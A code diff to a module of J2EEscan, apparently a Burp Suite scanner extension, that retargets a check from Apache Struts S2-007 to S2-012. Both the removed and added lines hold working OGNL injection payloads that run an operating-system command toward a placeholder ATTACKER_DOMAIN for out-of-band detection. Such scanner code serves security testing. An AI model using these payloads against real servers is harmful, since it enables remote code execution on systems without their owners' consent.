@@ -14,14 +14,14 @@ import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-public class StrutsS2007OOB implements IModule {
+public class StrutsS2012OOB implements IModule {
 
-    private static final String TITLE = "Apache Struts S2-007 Remote Code Execution (OOB)";
+    private static final String TITLE = "Struts S2-012 RCE (OOB)";
     private static final String DESCRIPTION = "J2EEscan identified Out Of Band RCE in the webpage"
             + "<b>References</b>:<br /><br />"
-            + "http://struts.apache.org/docs/s2-007.html<br />"
-            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-007<br />"
-            + "https://www.cnblogs.com/LittleHann/p/4640789.html";
+            + "http://struts.apache.org/docs/s2-012.html<br />"
+            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-012<br />"
+            + "https://github.com/ronoski/VulApps/tree/master/s/struts2/s2-012";
     private PrintWriter stderr;
     private static final String REMEDY = "Upgrade to latest Apache Struts version";
 
@@ -29,7 +29,7 @@ public class StrutsS2007OOB implements IModule {
     //Pattern.compile("java\\.io\\.FileNotFoundException", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
 
     public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
-        String payload_template = "' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('RCE_CMD ATTACKER_DOMAIN').getInputStream())) + '\n";
+        String payload_template = "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"RCE_CMD\", \"ATTACKER_DOMAIN\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\n";
         IExtensionHelpers helpers = callbacks.getHelpers();
         List<IScanIssue> issues = new ArrayList<>();
 
